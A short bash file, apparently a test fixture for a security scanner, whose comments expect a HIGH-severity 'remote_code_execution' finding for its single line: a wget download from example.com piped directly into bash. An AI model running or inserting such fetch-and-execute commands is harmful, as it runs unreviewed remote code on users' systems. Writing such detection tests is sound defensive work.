#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: remote_code_execution
wget -qO- http://example.com/x.sh | bash -s -- --yes
